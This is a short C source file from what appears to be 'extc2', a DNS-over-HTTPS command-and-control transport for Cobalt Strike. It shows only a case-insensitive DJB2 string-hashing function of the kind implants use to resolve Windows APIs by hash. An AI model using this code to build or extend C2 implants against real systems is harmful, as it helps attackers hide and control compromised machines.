/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * HashString
 *
 * Purpose:
 *
 * Converts a string of the specified length
 * into a 32 bit DJB2 hash.
 *
-*/
DEFINESEC(B) ULONG HashString( IN PVOID Inp, IN ULONG Len )
{
	ULONG  hsh;
	PUCHAR ptr;
	UCHAR  cur;

	hsh = 5381;
	ptr = Inp;

	while ( TRUE )
	{
		cur = * ptr;

		if ( ! Len ) {
			if ( ! * ptr ) {
				break;
			};
		} else {
			if ( ( ULONG )( ptr - ( PUCHAR )Inp ) >= Len ) {
				break;
			};
			if ( ! * ptr ) {
				++ptr; continue;
			};
		};

		if ( cur >= 'a' )
			cur -= 0x20;

		hsh = ((hsh << 5) + hsh) + cur; ++ptr;
	};

	return hsh;
};
